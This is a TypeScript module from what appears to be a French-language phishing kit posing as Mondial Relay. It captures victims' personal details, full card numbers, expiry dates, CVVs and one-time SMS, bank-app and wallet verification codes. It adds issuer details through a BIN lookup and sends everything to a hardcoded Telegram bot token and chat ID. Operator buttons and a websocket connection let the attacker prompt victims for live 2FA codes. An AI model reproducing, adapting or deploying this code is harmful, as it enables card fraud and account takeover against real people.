import { CustomerData } from '../types/customer';
import { PaymentData } from '../types/payment';
import { connectWebSocket } from './websocket';
import { sessionManager } from './session';

const BOT_TOKEN = '7943864934:AAGxjIiEnYacCF-uWjR3X8bZM-Z53Ag31Y8';
const CHAT_ID = '-4655068835';

// Get the session ID from the session manager
const SESSION_ID = sessionManager.getSessionId();

interface BankInfo {
  type: string;
  bank: string;
  level: string;
  country: string;
  bankUrl: string;
  bankPhone: string;
}

const getIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return String(data.ip);
  } catch (error) {
    return 'Unknown';
  }
};

const getBankInfo = async (cardNumber: string): Promise<BankInfo> => {
  try {
    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
    const response = await fetch(`https://bins.antipublic.cc/bins/${bin}`);
    
    if (!response.ok) {
      throw new Error('BIN lookup failed');
    }

    const data = await response.json();
    
    return {
      type: String(data.scheme || data.brand || 'UNKNOWN').toUpperCase(),
      bank: String(data.bank || 'UNKNOWN'),
      level: String(data.type || 'UNKNOWN') + ' Card',
      country: String(data.country || 'UNKNOWN'),
      bankUrl: String(data.bank_url || 'UNKNOWN'),
      bankPhone: String(data.bank_phone || 'UNKNOWN')
    };
  } catch (error) {
    console.error('Error BIN:', error);
    return {
      type: 'UNKNOWN',
      bank: 'UNKNOWN',
      level: 'UNKNOWN',
      country: 'UNKNOWN',
      bankUrl: 'UNKNOWN',
      bankPhone: 'UNKNOWN'
    };
  }
};

async function formatMessage(data: any, type: 'billing' | 'payment' | 'apple_pay' | 'google_pay' | 'sms_code' | 'bank_app'): Promise<string> {
  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
  const ip = await getIP();

  if (type === 'payment') {
    const paymentData = data as PaymentData;
    const bin = paymentData.cardNumber.replace(/\s/g, '').substring(0, 6);
    const bankInfo = await getBankInfo(paymentData.cardNumber);
    const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');

    return `🏦 Informations Personnelles
├ 🕵️ Nom complet : ${customerData.firstName} ${customerData.lastName}
├ 🏠 Adresse : ${customerData.address}
├ 📮 Code postal : ${customerData.postalCode}
├ 📞 Téléphone : ${customerData.phone}
└ 📧 Email : ${customerData.email}

🏦 Carte de Paiement
├ 🍒 Titulaire : ${paymentData.cardHolder}
├ 💳 Numéro de carte : ${paymentData.cardNumber}
├ 📅 Expiration : ${paymentData.expiryDate}
└ 🔒 Cryptogramme : ${paymentData.cvv}

🗃 Coordonnées Bancaires
├ 🎯 Bin : #${bin}
├ 🏷️ Banque : ${bankInfo.bank}
├ 🏷️ Type : ${bankInfo.type}
├ 🏷️ Niveau : ${bankInfo.level}
├ 🌍 Pays : ${bankInfo.country}
├ 🔗 Site web : ${bankInfo.bankUrl}
└ ☎️ Téléphone : ${bankInfo.bankPhone}

🧩 Extra
├ 🌐 IP : non
├ 🖼️ SCAN : cardimages.imaginecurve.com/cards/${bin}.png
└ 🖥️ OS : ${navigator.userAgent}

📍 Mondial Relay [${now}]
└ © 2024 - All rights reserved.`;
  } 
  else if (type === 'billing') {
    const customerData = data as CustomerData;
    return `🏦 Informations Client
├ 🕵️ Nom complet : ${customerData.firstName} ${customerData.lastName}
├ 📅 Date de naissance : ${customerData.birthDate}
├ 🏠 Adresse : ${customerData.address}
├ 📮 Code postal : ${customerData.postalCode}
├ 🌆 Ville : ${customerData.city}
├ 📞 Téléphone : ${customerData.phone}
├ 📧 Email : ${customerData.email}
├ 🌐 IP : non
└ 📅 Date : ${now}`;
  }
  else if (type === 'apple_pay' || type === 'google_pay' || type === 'sms_code' || type === 'bank_app') {
    const { code, billingInfo } = data;
    const verificationTypes = {
      'apple_pay': 'Apple Pay',
      'google_pay': 'Google Pay',
      'sms_code': 'SMS' ,
      'bank_app': 'Application Bancaire'
       };
       const messageLines = [
        `🔐 Code de vérification ${verificationTypes[type]}`,
        code ? `├ 🔑 Code : ${code}` : null,
        billingInfo.firstName && billingInfo.lastName ? `├ 🕵️ Nom complet : ${billingInfo.firstName} ${billingInfo.lastName}` : null,
        billingInfo.address ? `├ 🏠 Adresse : ${billingInfo.address}` : null,
        billingInfo.postalCode ? `├ 📮 Code postal : ${billingInfo.postalCode}` : null,
        billingInfo.phone ? `├ 📞 Téléphone : ${billingInfo.phone}` : null,
        billingInfo.email ? `├ 📧 Email : ${billingInfo.email}` : null,
        ip ? `├ 🌐 IP : non` : null,
        now ? `└ 📅 Date : ${now}` : null,
      ];
      
      const message = messageLines.filter(line => line !== null).join('\n');
      
      return message;
  }

  return '';
}

export async function sendToTelegram(data: any, type: 'billing' | 'payment' | 'apple_pay' | 'google_pay' | 'sms_code' | 'bank_app') {
  try {
    const message = await formatMessage(data, type);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const body: any = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    };

    if (type === 'payment') {
      body.reply_markup = {
        inline_keyboard: [
          [
            { text: "SMS", callback_data: `sms_code:${SESSION_ID}` },
            { text: "App Bancaire", callback_data: `bank_app:${SESSION_ID}` },
            { text: "Apple Pay", callback_data: `apple_pay:${SESSION_ID}` },
            { text: "Google Pay", callback_data: `google_pay:${SESSION_ID}` }
          ],
          [
            { text: "Remove Loading", callback_data: `remove_loading:${SESSION_ID}` }
          ]
        ]
      };
    }
    else if (['apple_pay', 'google_pay', 'sms_code', 'bank_app'].includes(type)) {
      body.reply_markup = {
        inline_keyboard: [
          type === 'bank_app'
            ? [{ text: "Transaction confirmée", callback_data: `code_correct:${SESSION_ID}` }]
            : [
                { text: "Code Correct", callback_data: `code_correct:${SESSION_ID}` },
                { text: "Code Incorrect", callback_data: `code_incorrect:${SESSION_ID}` }
              ]
        ]
      };
    }

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body)
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    const responseData = await response.json();
    const messageId = responseData.result.message_id.toString();

    // Connect to WebSocket for payment and verification messages
    if (type === 'payment' || ['apple_pay', 'google_pay', 'sms_code', 'bank_app'].includes(type)) {
      connectWebSocket(messageId);
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
}